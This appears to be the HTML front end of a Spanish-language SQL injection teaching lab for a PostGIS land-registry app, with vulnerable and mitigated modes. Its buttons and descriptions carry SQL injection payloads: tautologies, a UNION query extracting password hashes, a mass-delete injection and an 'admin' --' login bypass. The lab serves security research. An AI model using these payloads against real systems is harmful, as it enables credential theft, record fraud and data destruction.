@@ -1,0 +1,1553 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CATASTRO POSTGIS // SECURITY PLAYGROUND (DOCTORAL RESEARCH)</title>
+  
+  <!-- Estilo Fira Code y Font Awesome Icons -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;500;600;700&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  
+  <!-- Leaflet CSS -->
+  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+  
+  <!-- Bootstrap 5 CSS -->
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+
+  <style>
+    :root {
+      --bg-main: #07090e;
+      --bg-panel: rgba(15, 23, 42, 0.75);
+      --bg-panel-hover: rgba(30, 41, 59, 0.85);
+      --bg-card: rgba(15, 23, 42, 0.65);
+      --border-card: rgba(255, 255, 255, 0.08);
+      --border-glow: rgba(129, 140, 248, 0.25);
+      --primary: #818cf8;
+      --primary-glow: rgba(129, 140, 248, 0.2);
+      --accent: #10b981;
+      --accent-glow: rgba(16, 185, 129, 0.25);
+      --danger: #f43f5e;
+      --danger-glow: rgba(244, 63, 94, 0.25);
+      --warning: #f59e0b;
+      --warning-glow: rgba(245, 158, 11, 0.25);
+      --cyan: #38bdf8;
+      --text-main: #f1f5f9;
+      --text-muted: #94a3b8;
+      --font-code: 'Fira Code', 'Consolas', monospace;
+      --font-ui: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+    }
+
+    * { box-sizing: border-box; }
+
+    body {
+      background-color: var(--bg-main);
+      color: var(--text-main);
+      font-family: var(--font-ui);
+      margin: 0;
+      padding: 1rem;
+      min-height: 100vh;
+      background-image: 
+        radial-gradient(circle at 10% 15%, rgba(129, 140, 248, 0.06) 0%, transparent 40%),
+        radial-gradient(circle at 90% 85%, rgba(16, 185, 129, 0.05) 0%, transparent 40%);
+      background-attachment: fixed;
+    }
+
+    code, pre, .font-mono {
+      font-family: var(--font-code) !important;
+    }
+
+    /* Glassmorphism Card Style de catastro_webmapping / CATASTRO_LI */
+    .glass-card {
+      background: var(--bg-card);
+      backdrop-filter: blur(14px);
+      -webkit-backdrop-filter: blur(14px);
+      border: 1px solid var(--border-card);
+      border-radius: 12px;
+      box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.45);
+      transition: border-color 0.2s ease, box-shadow 0.2s ease;
+    }
+    .glass-card:hover {
+      border-color: rgba(255, 255, 255, 0.14);
+    }
+
+    /* Top Brand & Controls Header */
+    .top-header {
+      background: rgba(11, 15, 25, 0.85);
+      backdrop-filter: blur(12px);
+      border: 1px solid var(--border-glow);
+      border-radius: 12px;
+      padding: 0.85rem 1.25rem;
+      margin-bottom: 1rem;
+    }
+
+    .brand-title {
+      font-family: var(--font-code);
+      font-size: 1.15rem;
+      font-weight: 700;
+      letter-spacing: 0.5px;
+      display: flex;
+      align-items: center;
+      gap: 0.6rem;
+      color: var(--primary);
+    }
+
+    .brand-badge {
+      background: rgba(129, 140, 248, 0.15);
+      color: var(--primary);
+      border: 1px solid rgba(129, 140, 248, 0.35);
+      font-size: 0.7rem;
+      font-weight: 600;
+      padding: 0.2rem 0.5rem;
+      border-radius: 6px;
+      letter-spacing: 1px;
+      text-transform: uppercase;
+    }
+
+    /* Switcher de Modo Seguro vs Vulnerable */
+    .mode-switch-container {
+      display: flex;
+      background: rgba(0, 0, 0, 0.5);
+      border: 1px solid var(--border-card);
+      border-radius: 30px;
+      padding: 3px;
+      gap: 4px;
+    }
+
+    .btn-mode {
+      border: none;
+      background: transparent;
+      color: var(--text-muted);
+      font-family: var(--font-code);
+      font-size: 0.8rem;
+      font-weight: 600;
+      padding: 0.4rem 0.9rem;
+      border-radius: 25px;
+      transition: all 0.25s ease;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 0.45rem;
+    }
+
+    .btn-mode.active-vuln {
+      background: var(--danger);
+      color: #ffffff;
+      box-shadow: 0 0 16px var(--danger-glow);
+    }
+
+    .btn-mode.active-mit {
+      background: var(--accent);
+      color: #ffffff;
+      box-shadow: 0 0 16px var(--accent-glow);
+    }
+
+    /* PIPELINE VISUAL DE LAS 3 BARRERAS (DEFENSA EN PROFUNDIDAD) */
+    .pipeline-wrapper {
+      background: rgba(11, 15, 25, 0.88);
+      border: 1px solid rgba(129, 140, 248, 0.2);
+      border-radius: 12px;
+      padding: 0.85rem 1rem;
+      margin-bottom: 1rem;
+    }
+
+    .pipeline-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 0.75rem;
+      padding-bottom: 0.4rem;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+    }
+
+    .pipeline-grid {
+      display: grid;
+      grid-template-columns: 1fr auto 1fr auto 1fr;
+      align-items: center;
+      gap: 0.5rem;
+    }
+
+    .barrier-card {
+      background: rgba(15, 23, 42, 0.8);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 10px;
+      padding: 0.7rem 0.9rem;
+      position: relative;
+      transition: all 0.3s ease;
+    }
+
+    .barrier-card.evaluating {
+      border-color: var(--warning);
+      box-shadow: 0 0 15px var(--warning-glow);
+    }
+
+    .barrier-card.blocked {
+      border-color: var(--danger);
+      background: rgba(244, 63, 94, 0.08);
+      box-shadow: 0 0 15px var(--danger-glow);
+    }
+
+    .barrier-card.passed {
+      border-color: var(--accent);
+      background: rgba(16, 185, 129, 0.08);
+      box-shadow: 0 0 15px var(--accent-glow);
+    }
+
+    .barrier-card.bypassed {
+      border-color: var(--danger);
+      border-style: dashed;
+      background: rgba(244, 63, 94, 0.04);
+    }
+
+    .barrier-badge {
+      font-size: 0.68rem;
+      font-family: var(--font-code);
+      font-weight: 700;
+      padding: 0.15rem 0.45rem;
+      border-radius: 4px;
+      display: inline-block;
+      margin-bottom: 0.25rem;
+    }
+
+    .barrier-arrow {
+      color: var(--text-muted);
+      font-size: 1.1rem;
+      opacity: 0.4;
+      transition: all 0.3s ease;
+    }
+    .barrier-arrow.active {
+      color: var(--primary);
+      opacity: 1;
+      transform: scale(1.15);
+    }
+
+    /* Mapa Leaflet */
+    #map {
+      height: 480px;
+      width: 100%;
+      border-radius: 10px;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      background: #0b0f19;
+    }
+
+    /* Consola de Código / Terminal */
+    .terminal-box {
+      background: #030712;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      border-radius: 8px;
+      padding: 0.85rem;
+      font-family: var(--font-code);
+      font-size: 0.82rem;
+      color: var(--cyan);
+      max-height: 230px;
+      overflow-y: auto;
+      white-space: pre-wrap;
+      word-break: break-all;
+      position: relative;
+    }
+
+    .terminal-box::before {
+      content: "SQL QUERY INSPECTOR";
+      position: absolute;
+      top: 4px;
+      right: 8px;
+      font-size: 0.65rem;
+      color: var(--text-muted);
+      opacity: 0.6;
+      letter-spacing: 1px;
+    }
+
+    /* Botones de las 6 Amenazas */
+    .attack-btn {
+      background: rgba(15, 23, 42, 0.7);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 8px;
+      padding: 0.65rem 0.85rem;
+      text-align: left;
+      color: var(--text-main);
+      transition: all 0.2s ease;
+      cursor: pointer;
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      gap: 0.2rem;
+    }
+    .attack-btn:hover {
+      background: rgba(30, 41, 59, 0.9);
+      border-color: var(--primary);
+      transform: translateY(-1px);
+    }
+    .attack-btn.active-target {
+      border-color: var(--danger);
+      background: rgba(244, 63, 94, 0.1);
+    }
+
+    .threat-tag {
+      font-family: var(--font-code);
+      font-size: 0.7rem;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    /* Badges y Pills */
+    .stat-pill {
+      background: rgba(0, 0, 0, 0.4);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 20px;
+      padding: 0.25rem 0.65rem;
+      font-size: 0.78rem;
+      font-family: var(--font-code);
+      display: inline-flex;
+      align-items: center;
+      gap: 0.4rem;
+    }
+
+    .pulse-dot {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      display: inline-block;
+    }
+    .pulse-dot.online {
+      background: var(--accent);
+      box-shadow: 0 0 8px var(--accent);
+    }
+    .pulse-dot.danger {
+      background: var(--danger);
+      box-shadow: 0 0 8px var(--danger);
+    }
+
+    /* Tablas High-Tech */
+    .table-custom {
+      color: var(--text-main);
+      font-size: 0.82rem;
+      margin-bottom: 0;
+    }
+    .table-custom th {
+      background: rgba(11, 15, 25, 0.9);
+      border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+      color: var(--text-muted);
+      font-family: var(--font-code);
+      font-weight: 600;
+      font-size: 0.75rem;
+      padding: 0.5rem 0.6rem;
+    }
+    .table-custom td {
+      border-bottom: 1px solid rgba(255, 255, 255, 0.04);
+      padding: 0.45rem 0.6rem;
+      vertical-align: middle;
+    }
+
+    /* Custom Scrollbar */
+    ::-webkit-scrollbar {
+      width: 6px;
+      height: 6px;
+    }
+    ::-webkit-scrollbar-track {
+      background: rgba(7, 9, 14, 0.8);
+    }
+    ::-webkit-scrollbar-thumb {
+      background: rgba(255, 255, 255, 0.15);
+      border-radius: 3px;
+    }
+    /* Leaflet Dark Tiles y Controles */
+    .dark-tiles {
+      filter: brightness(0.6) invert(1) contrast(2.5) hue-rotate(195deg) saturate(0.35) !important;
+    }
+    .leaflet-control-layers {
+      background: rgba(11, 15, 25, 0.9) !important;
+      border: 1px solid rgba(255, 255, 255, 0.15) !important;
+      color: var(--text-main) !important;
+      font-family: var(--font-code) !important;
+      font-size: 0.75rem !important;
+      border-radius: 8px !important;
+    }
+    .leaflet-control-layers-base label {
+      color: var(--text-main) !important;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- HEADER BRAND / TOP CONTROLS -->
+  <div class="top-header d-flex flex-wrap justify-content-between align-items-center gap-3">
+    <div class="d-flex align-items-center gap-3">
+      <div class="brand-title">
+        <i class="fa-solid fa-shield-halved text-info"></i>
+        <span>POSTGIS SECURITY // EXPERIMENTAL LAB</span>
+        <span class="brand-badge">ISO 19152 LADM</span>
+      </div>
+    </div>
+
+    <!-- STATS PILLS & CONTROLS -->
+    <div class="d-flex flex-wrap align-items-center gap-2">
+      <div class="stat-pill">
+        <span class="pulse-dot online" id="dotDb"></span>
+        <span class="text-secondary">Lotes:</span>
+        <strong id="lblTotalLotes" class="text-white">...</strong>
+      </div>
+      <div class="stat-pill">
+        <span class="text-secondary">Titulares:</span>
+        <strong id="lblTotalTitulares" class="text-white">...</strong>
+      </div>
+      <button class="btn btn-sm btn-outline-warning font-mono py-1 px-2" onclick="resetDatabase()" title="Restaura la muestra original de 1,500 lotes">
+        <i class="fa-solid fa-rotate-right me-1"></i> Restaurar BD
+      </button>
+
+      <!-- SWITCH DE MODO -->
+      <div class="mode-switch-container ms-2">
+        <button id="btnModeVuln" class="btn-mode active-vuln" onclick="setMode('vulnerable')">
+          <i class="fa-solid fa-triangle-exclamation"></i>
+          <span>SQL Dinámico (Vulnerable)</span>
+        </button>
+        <button id="btnModeMit" class="btn-mode" onclick="setMode('mitigated')">
+          <i class="fa-solid fa-shield"></i>
+          <span>3 Barreras (Mitigado)</span>
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <!-- PIPELINE VISUAL DE LAS 3 BARRERAS DE DEFENSA EN PROFUNDIDAD -->
+  <div class="pipeline-wrapper">
+    <div class="pipeline-header">
+      <div class="d-flex align-items-center gap-2">
+        <span class="font-mono text-info fw-bold" style="font-size: 0.85rem;">
+          <i class="fa-solid fa-layer-group me-1"></i> PIPELINE DE DEFENSA EN PROFUNDIDAD (LAS 3 BARRERAS)
+        </span>
+        <span class="badge bg-secondary font-mono" id="pipelineStatusBadge">MODO VULNERABLE ACTIVO (BARRERAS INACTIVAS)</span>
+      </div>
+      <small class="text-secondary font-mono" id="pipelineLatency">Latencia total: - ms</small>
+    </div>
+
+    <div class="pipeline-grid">
+      <!-- BARRERA 1: PYDANTIC (API INGRESS) -->
+      <div class="barrier-card" id="cardBarrier1">
+        <div class="d-flex justify-content-between align-items-center">
+          <span class="barrier-badge bg-primary text-white">BARRERA 1</span>
+          <span class="badge bg-dark font-mono text-secondary" id="statusBarrier1">STANDBY</span>
+        </div>
+        <div class="fw-bold mt-1 text-light" style="font-size: 0.85rem;">
+          <i class="fa-solid fa-filter me-1 text-primary"></i> Pydantic & Acotamiento
+        </div>
+        <small class="text-secondary d-block mt-1" style="font-size: 0.72rem; line-height: 1.25;" id="descBarrier1">
+          Capa API: Tipado estricto (float, int), regex (^\\d{4}$) y límites numéricos de buffers (gt=0, le=100).
+        </small>
+      </div>
+
+      <!-- FLECHA 1 -->
+      <div class="text-center">
+        <i class="fa-solid fa-chevron-right barrier-arrow" id="arrow1"></i>
+      </div>
+
+      <!-- BARRERA 2: SHAPELY (GEOMETRY-AWARE ENGINE) -->
+      <div class="barrier-card" id="cardBarrier2">
+        <div class="d-flex justify-content-between align-items-center">
+          <span class="barrier-badge bg-info text-dark">BARRERA 2</span>
+          <span class="badge bg-dark font-mono text-secondary" id="statusBarrier2">STANDBY</span>
+        </div>
+        <div class="fw-bold mt-1 text-light" style="font-size: 0.85rem;">
+          <i class="fa-solid fa-draw-polygon me-1 text-info"></i> Shapely Topology Check
+        </div>
+        <small class="text-secondary d-block mt-1" style="font-size: 0.72rem; line-height: 1.25;" id="descBarrier2">
+          Capa Aplicación: Validación topológica en memoria (shapely.wkt.loads) antes de tocar PostgreSQL.
+        </small>
+      </div>
+
+      <!-- FLECHA 2 -->
+      <div class="text-center">
+        <i class="fa-solid fa-chevron-right barrier-arrow" id="arrow2"></i>
+      </div>
+
+      <!-- BARRERA 3: GEOALCHEMY2 (PERSISTENCIA Y BIND VARIABLES) -->
+      <div class="barrier-card" id="cardBarrier3">
+        <div class="d-flex justify-content-between align-items-center">
+          <span class="barrier-badge bg-success text-white">BARRERA 3</span>
+          <span class="badge bg-dark font-mono text-secondary" id="statusBarrier3">STANDBY</span>
+        </div>
+        <div class="fw-bold mt-1 text-light" style="font-size: 0.85rem;">
+          <i class="fa-solid fa-database me-1 text-success"></i> GeoAlchemy2 / Bind ORM
+        </div>
+        <small class="text-secondary d-block mt-1" style="font-size: 0.72rem; line-height: 1.25;" id="descBarrier3">
+          Capa Motor: Prepared Statements con bind variables binarias (EWKB). Parámetros aislados de la sintaxis.
+        </small>
+      </div>
+    </div>
+  </div>
+
+  <!-- MAIN WORKSPACE LAYOUT -->
+  <div class="row g-3">
+    
+    <!-- COLUMNA IZQUIERDA: MAPA Y BUSCADOR (7 COLS) -->
+    <div class="col-lg-7">
+      <!-- CARD VISOR CARTOGRÁFICO -->
+      <div class="glass-card p-3 mb-3">
+        <div class="d-flex justify-content-between align-items-center mb-2">
+          <div class="d-flex align-items-center gap-2">
+            <i class="fa-solid fa-map-location-dot text-primary"></i>
+            <span class="fw-bold font-mono text-light" style="font-size: 0.9rem;">VISOR CATASTRAL PUNO (EPSG:32719 UTM 19S)</span>
+          </div>
+          <div class="d-flex gap-2 align-items-center">
+            <span class="badge bg-dark text-secondary border border-secondary font-mono" id="lblMapStatus">Listo</span>
+            <button class="btn btn-xs btn-outline-secondary font-mono py-0 px-2" onclick="fitCatastroBounds()" style="font-size: 0.75rem;">
+              <i class="fa-solid fa-expand me-1"></i> Centrar
+            </button>
+          </div>
+        </div>
+        
+        <div id="map"></div>
+        
+        <div class="d-flex justify-content-between align-items-center mt-2 text-secondary font-mono" style="font-size: 0.72rem;">
+          <span>* Lotes resaltados en <span class="text-danger fw-bold">rojo</span> indican parcelas exfiltradas, vulneradas o fuera del límite legal.</span>
+          <span id="lblCoords">391,200 E | 8,245,100 N</span>
+        </div>
+      </div>
+
+      <!-- BUSCADOR INTERACTIVO CON PAYLOADS RÁPIDOS -->
+      <div class="glass-card p-3 mb-3">
+        <div class="d-flex justify-content-between align-items-center mb-2">
+          <span class="fw-bold font-mono text-cyan" style="font-size: 0.85rem;">
+            <i class="fa-solid fa-magnifying-glass me-1"></i> BUSCADOR CATASTRAL (LABORATORIO DE SQLi MANUAL)
+          </span>
+          <span class="badge bg-secondary font-mono" id="lblResultadosBusqueda">0 resultados</span>
+        </div>
+
+        <div class="input-group mb-2">
+          <span class="input-group-text bg-dark border-secondary text-secondary font-mono" style="font-size: 0.8rem;">CRITERIO</span>
+          <input type="text" id="inputCriterio" class="form-control bg-dark text-white border-secondary font-mono" style="font-size: 0.85rem;"
+                 placeholder="ID de lote, titular o payload (ej: 21010101000000 o ' OR '1'='1)..."
+                 onkeydown="if(event.key === 'Enter') ejecutarBusquedaLotes()">
+          <button class="btn btn-primary font-mono px-3" onclick="ejecutarBusquedaLotes()" style="font-size: 0.85rem;">
+            <i class="fa-solid fa-bolt me-1"></i> Evaluar
+          </button>
+          <button class="btn btn-outline-secondary font-mono px-2" onclick="limpiarBusqueda()" style="font-size: 0.85rem;">
+            Limpiar
+          </button>
+        </div>
+
+        <!-- Presets rápidos -->
+        <div class="d-flex flex-wrap gap-1 align-items-center mb-2">
+          <span class="font-mono text-secondary me-1" style="font-size: 0.7rem;">INYECCIONES RÁPIDAS:</span>
+          <button class="btn btn-sm btn-outline-info font-mono py-0 px-2" style="font-size: 0.72rem;" onclick="setSearchPayload('21010101000000')">Normal (1 predio)</button>
+          <button class="btn btn-sm btn-outline-danger font-mono py-0 px-2" style="font-size: 0.72rem;" onclick="setSearchPayload(&quot;' OR '1'='1&quot;)">SQLi Tautología (' OR '1'='1)</button>
+          <button class="btn btn-sm btn-outline-danger font-mono py-0 px-2" style="font-size: 0.72rem;" onclick="setSearchPayload(&quot;%' OR 1=1 --&quot;)">SQLi Comentario (1=1 --)</button>
+          <button class="btn btn-sm btn-outline-warning font-mono py-0 px-2" style="font-size: 0.72rem;" onclick="setSearchPayload(&quot;' UNION SELECT username, role, 'EXFILTRADO', password_hash, 0, NULL FROM catastro_usuarios --&quot;)">SQLi UNION Passwords</button>
+        </div>
+
+        <!-- Tabla resultados de búsqueda -->
+        <div id="divResultadosBusqueda" class="d-none mt-2">
+          <div class="table-responsive" style="max-height: 140px; overflow-y: auto;">
+            <table class="table table-custom table-hover">
+              <thead>
+                <tr>
+                  <th>ID LOTE</th>
+                  <th>SECTOR</th>
+                  <th>TITULAR PREDIAL</th>
+                  <th>AUTOVALÚO</th>
+                  <th>ACCIÓN</th>
+                </tr>
+              </thead>
+              <tbody id="tblResultadosBusqueda" class="font-mono"></tbody>
+            </table>
+          </div>
+        </div>
+      </div>
+
+      <!-- TABLA MUESTRAL DE FICHAS PREDIALES -->
+      <div class="glass-card p-3">
+        <div class="d-flex justify-content-between align-items-center mb-2">
+          <span class="fw-bold font-mono text-light" style="font-size: 0.85rem;">
+            <i class="fa-solid fa-address-card me-1 text-warning"></i> FICHAS CATASTRALES FISCALES (INTEGRIDAD DE DATOS)
+          </span>
+          <small class="text-secondary font-mono" style="font-size: 0.7rem;">Muestra LADM LA_Party</small>
+        </div>
+        <div class="table-responsive" style="max-height: 160px; overflow-y: auto;">
+          <table class="table table-custom">
+            <thead>
+              <tr>
+                <th>ID LOTE</th>
+                <th>DNI TITULAR</th>
+                <th>NOMBRE DEL TITULAR</th>
+                <th>AUTOVALÚO (S/)</th>
+              </tr>
+            </thead>
+            <tbody id="tblTitulares" class="font-mono">
+              <tr><td colspan="4" class="text-center text-secondary py-3">Cargando datos catastrales...</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+
+    <!-- COLUMNA DERECHA: LAS 6 AMENAZAS Y DEEP INSPECTOR (5 COLS) -->
+    <div class="col-lg-5">
+      
+      <!-- PANEL DE LAS 6 AMENAZAS FORMALIZADAS -->
+      <div class="glass-card p-3 mb-3">
+        <div class="d-flex justify-content-between align-items-center mb-2">
+          <span class="fw-bold font-mono text-danger" style="font-size: 0.9rem;">
+            <i class="fa-solid fa-biohazard me-1"></i> BATERÍA DE LAS 6 AMENAZAS DEL PAPER
+          </span>
+          <span class="badge bg-dark text-danger border border-danger font-mono" style="font-size: 0.68rem;">EXPLOIT CONSOLE</span>
+        </div>
+
+        <div class="d-flex flex-column gap-2 mt-2">
+          
+          <!-- AMENAZA 1 -->
+          <div class="attack-btn" onclick="runAttack1_Bypass()" id="btnAtk1">
+            <div class="d-flex justify-content-between align-items-center">
+              <span class="threat-tag text-danger"><i class="fa-solid fa-vector-square me-1"></i> 1. Spatial Logic Bypass</span>
+              <span class="badge bg-dark font-mono text-secondary" style="font-size: 0.65rem;">GET /predios/radio</span>
+            </div>
+            <small class="text-secondary font-mono" style="font-size: 0.73rem;">
+              Rompe ST_DWithin y sector con <code>50) OR (1=1</code> exfiltrando todo el catastro.
+            </small>
+          </div>
+
+          <!-- AMENAZA 2 -->
+          <div class="attack-btn" onclick="runAttack2_ErrorBased()" id="btnAtk2">
+            <div class="d-flex justify-content-between align-items-center">
+              <span class="threat-tag text-warning"><i class="fa-solid fa-bug me-1"></i> 2. Error-Based Spatial SQLi</span>
+              <span class="badge bg-dark font-mono text-secondary" style="font-size: 0.65rem;">GET /predios/poligono</span>
+            </div>
+            <small class="text-secondary font-mono" style="font-size: 0.73rem;">
+              Canal lateral: Detona excepciones en GEOS (<code>ST_GeomFromText('ERR')</code>) para inferir hashes de password.
+            </small>
+            <!-- Sub-botón de inferencia paso a paso -->
+            <div class="mt-1 pt-1 border-top border-secondary border-opacity-25 d-flex justify-content-end">
+              <button class="btn btn-xs btn-outline-warning font-mono py-0 px-2" style="font-size: 0.68rem;" onclick="event.stopPropagation(); startLiveErrorBlindExfiltration()">
+                <i class="fa-solid fa-terminal me-1"></i> Simular Extracción Ciega
+              </button>
+            </div>
+          </div>
+
+          <!-- AMENAZA 3 -->
+          <div class="attack-btn" onclick="runAttack3_SpatialDoS()" id="btnAtk3">
+            <div class="d-flex justify-content-between align-items-center">
+              <span class="threat-tag text-danger"><i class="fa-solid fa-fire me-1"></i> 3. Spatial DoS (Algorithmic Complexity)</span>
+              <span class="badge bg-dark font-mono text-secondary" style="font-size: 0.65rem;">GET /analisis-expansion</span>
+            </div>
+            <small class="text-secondary font-mono" style="font-size: 0.73rem;">
+              Fuerza producto cruzado O(N²) en ST_Buffer sobrecargando el motor GEOS y disparando la latencia 15x.
+            </small>
+          </div>
+
+          <!-- AMENAZA 4 -->
+          <div class="attack-btn" onclick="runAttack4_Tampering()" id="btnAtk4">
+            <div class="d-flex justify-content-between align-items-center">
+              <span class="threat-tag text-warning"><i class="fa-solid fa-file-pen me-1"></i> 4. Fraude en Ficha (Tampering)</span>
+              <span class="badge bg-dark font-mono text-secondary" style="font-size: 0.65rem;">POST /ficha/modificar</span>
+            </div>
+            <small class="text-secondary font-mono" style="font-size: 0.73rem;">
+              Inyecta en la cláusula UPDATE fijando autovalúo en S/ 0.00 y usurpando la titularidad predial.
+            </small>
+          </div>
+
+          <!-- AMENAZA 5 -->
+          <div class="attack-btn" onclick="runAttack5_DataDestruction()" id="btnAtk5">
+            <div class="d-flex justify-content-between align-items-center">
+              <span class="threat-tag text-danger"><i class="fa-solid fa-trash-can me-1"></i> 5. Destrucción Cartográfica (Data Loss)</span>
+              <span class="badge bg-dark font-mono text-secondary" style="font-size: 0.65rem;">DELETE /predios/borrar</span>
+            </div>
+            <small class="text-secondary font-mono" style="font-size: 0.73rem;">
+              Inyecta tautología <code>0101' OR '1'='1</code> ejecutando borrado masivo incondicional de los 1,500 lotes.
+            </small>
+          </div>
+
+          <!-- AMENAZA 6 -->
+          <div class="attack-btn" onclick="runAttack6_AuthBypass()" id="btnAtk6">
+            <div class="d-flex justify-content-between align-items-center">
+              <span class="threat-tag text-info"><i class="fa-solid fa-key me-1"></i> 6. Bypass de Login (Privilege Escalation)</span>
+              <span class="badge bg-dark font-mono text-secondary" style="font-size: 0.65rem;">POST /auth/login</span>
+            </div>
+            <small class="text-secondary font-mono" style="font-size: 0.73rem;">
+              Inyecta <code>admin' --</code> en credenciales para emitir token con rol 'superadmin_catastro' sin clave.
+            </small>
+          </div>
+
+        </div>
+      </div>
+
+      <!-- INSPECTOR DESTAPADO: LIVE SERVER & DATABASE TRACE -->
+      <div class="glass-card p-3">
+        <div class="d-flex justify-content-between align-items-center mb-2">
+          <div class="d-flex align-items-center gap-2">
+            <i class="fa-solid fa-microchip text-info"></i>
+            <span class="fw-bold font-mono text-light" style="font-size: 0.85rem;">DEEP INSPECTOR // SERVIDOR Y MOTOR SQL</span>
+          </div>
+          <span id="badgeVerdict" class="badge bg-secondary font-mono" style="font-size: 0.75rem;">ESPERANDO ACCIÓN</span>
+        </div>
+
+        <div class="terminal-box mb-2" id="boxQuery">-- Selecciona una de las 6 amenazas o realiza una búsqueda para ver la compilación interna --</div>
+
+        <div class="row g-2 mb-2 font-mono" style="font-size: 0.78rem;">
+          <div class="col-4">
+            <div class="p-2 rounded bg-dark border border-secondary border-opacity-25">
+              <span class="text-secondary d-block" style="font-size: 0.68rem;">LATENCIA:</span>
+              <strong id="lblLatency" class="text-white">- ms</strong>
+            </div>
+          </div>
+          <div class="col-4">
+            <div class="p-2 rounded bg-dark border border-secondary border-opacity-25">
+              <span class="text-secondary d-block" style="font-size: 0.68rem;">CÓDIGO HTTP:</span>
+              <strong id="lblHttpCode" class="text-white">-</strong>
+            </div>
+          </div>
+          <div class="col-4">
+            <div class="p-2 rounded bg-dark border border-secondary border-opacity-25">
+              <span class="text-secondary d-block" style="font-size: 0.68rem;">DEFENSA ACTIVA:</span>
+              <strong id="lblActiveBarrier" class="text-info">Ninguna</strong>
+            </div>
+          </div>
+        </div>
+
+        <div class="p-2 rounded bg-dark border border-secondary border-opacity-25 text-secondary" style="font-size: 0.75rem; line-height: 1.35;" id="boxExplanation">
+          <i class="fa-solid fa-graduation-cap text-primary me-1"></i>
+          <strong>Análisis Arquitectónico Doctoral:</strong> Selecciona un vector de explotación. En tiempo real se desglosará cómo las tres barreras de defensa en profundidad interceptan o dejan pasar la carga maliciosa según el modo configurado.
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- Leaflet JS -->
+  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+  
+  <script>
+    let activeMode = 'vulnerable'; // 'vulnerable' o 'mitigated'
+    const API_BASE = window.location.origin + '/api/v1';
+
+    // Mapa Leaflet
+    const map = L.map('map', {
+      zoomControl: true,
+      attributionControl: false
+    }).setView([-15.840, -70.021], 15);
+
+    // Capas Base de Alta Resolución 100% Libres de API Key (Sin marcas de agua)
+    const layerGoogleSat = L.tileLayer('https://mt1.google.com/vt/lyrs=y&x={x}&y={y}&z={z}', {
+      maxZoom: 20,
+      attribution: '© Google Satellite'
+    });
+
+    const layerDarkOSM = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+      maxZoom: 19,
+      className: 'dark-tiles',
+      attribution: '© OpenStreetMap'
+    });
+
+    const layerStandardOSM = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+      maxZoom: 19,
+      attribution: '© OpenStreetMap'
+    });
+
+    // Activar por defecto Google Satellite HD (muestra la ortofoto real de Puno)
+    layerGoogleSat.addTo(map);
+
+    // Control de cambio de capas en la esquina superior derecha
+    L.control.layers({
+      "🛰️ Satelital Google (HD)": layerGoogleSat,
+      "🌙 Cyber Dark (OSM)": layerDarkOSM,
+      "🗺️ OpenStreetMap": layerStandardOSM
+    }, null, { position: 'topright' }).addTo(map);
+
+    let geojsonLayer = null;
+    let baseGeojsonData = null;
+    let searchResultItems = [];
+
+    // Coordinadas de Puno aproximadas para el visor
+    map.on('mousemove', function(e) {
+      document.getElementById('lblCoords').textContent = `LAT: ${e.latlng.lat.toFixed(5)} | LNG: ${e.latlng.lng.toFixed(5)}`;
+    });
+
+    // ==========================================
+    // CAMBIO DE MODO Y ACTUALIZACIÓN DE PIPELINE
+    // ==========================================
+    function setMode(mode) {
+      activeMode = mode;
+      const btnVuln = document.getElementById('btnModeVuln');
+      const btnMit = document.getElementById('btnModeMit');
+      const pipelineBadge = document.getElementById('pipelineStatusBadge');
+
+      if (mode === 'vulnerable') {
+        btnVuln.className = 'btn-mode active-vuln';
+        btnMit.className = 'btn-mode';
+        pipelineBadge.textContent = 'MODO VULNERABLE ACTIVO (BARRERAS INACTIVAS)';
+        pipelineBadge.className = 'badge bg-danger font-mono';
+        resetPipelineUI();
+      } else {
+        btnVuln.className = 'btn-mode';
+        btnMit.className = 'btn-mode active-mit';
+        pipelineBadge.textContent = 'DEFENSA EN PROFUNDIDAD ACTIVA (3 BARRERAS)';
+        pipelineBadge.className = 'badge bg-success font-mono';
+        resetPipelineUI();
+      }
+      
+      setInspectorData(
+        `MODO CAMBIADO A: ${mode.toUpperCase()}`,
+        `-- Configuración de entorno actualizada --\nAPI Activa: ${API_BASE}/${mode}`,
+        0,
+        200,
+        mode === 'vulnerable' ? '⚠️ Modo Vulnerable' : '🛡️ Defensa en Profundidad',
+        mode === 'vulnerable'
+          ? 'Las consultas se construirán concatenando cadenas (f-strings). PostGIS procesará directamente cualquier sintaxis inyectada.'
+          : 'La arquitectura ha activado las 3 barreras: Pydantic (Capa 1), Shapely (Capa 2) y GeoAlchemy2 (Capa 3).'
+      );
+    }
+
+    function resetPipelineUI() {
